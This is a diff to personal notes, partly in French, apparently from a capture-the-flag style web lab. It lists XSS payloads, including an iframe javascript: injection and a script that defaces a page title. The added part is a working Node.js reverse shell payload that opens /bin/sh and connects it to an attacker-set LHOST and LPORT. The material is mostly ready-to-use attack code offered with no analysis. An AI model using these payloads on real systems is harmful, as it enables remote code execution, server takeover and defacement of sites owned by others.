@@ -58,3 +58,13 @@ http://10.10.186.74/#/track-result?id=<iframe src="javascript:alert(`xss`)">
 <script>document.querySelector('#thm-title').textContent = 'I am a hacker'</script>
 où thm-title est l'id. Ici, c'était un span du genre
 <span id='thm-title'>kenjf</span>
+
+
+## Reverse shell 
+Set LPORT to Local Port  
+Set LHOST to Local Host
+```html
+<script>
+(function(){ var net = require("net"), cp = require("child_process"), sh = cp.spawn("/bin/sh", []); var client = new net.Socket(); client.connect(1234, "127.0.0.1", function(){ client.pipe(sh.stdin); sh.stdout.pipe(client); sh.stderr.pipe(client); }); return /a/; })();
+</script>
+```
